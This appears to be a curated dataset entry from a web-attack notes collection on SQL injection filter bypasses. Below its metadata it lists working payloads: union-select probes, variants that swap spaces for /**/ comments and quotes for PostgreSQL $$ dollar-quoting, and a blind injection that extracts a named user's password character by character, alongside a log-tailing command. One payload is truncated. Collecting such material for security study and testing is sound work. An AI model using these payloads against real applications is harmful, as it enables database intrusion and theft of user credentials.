---
technique: "Common Character Bypasses"
family: "injection"
severity_hint: "critical"
tags: []
source: "_raw/Web attacks/Web Attacks/SQLi/Advanced SQLi Techniques/Common Character Bypasses.md"
source_sha256: "19651278d7b8ad0b5fe702de0e2b4bf36538587bbacdb5b36e9e34dc640c4b56"
curator_version: 2
...
- `sql: @GetMapping({"/find-user"})`
- `sql: ' union select '1','2','3'--`
- `sql: '/**/union/**/select/**/$$1$$,$$2$$,$$3$$--`
- `sql: tail /opt/bluebird/pg_log/postgresql-2023-02-15_052440.log`
- `sql: '/**/union/**/select/**/$$1$$,$$2$$,$$3$$,$$4$$,$$5$$,$$6$$--`
- `sql: ' AND id=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='itsmaria')--`
- `sql: '/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,1,1))/**/FROM/**/users/**/WHERE/**/user`
...
## Source
Original note: `_raw/Web attacks/Web Attacks/SQLi/Advanced SQLi Techniques/Common Character Bypasses.md`
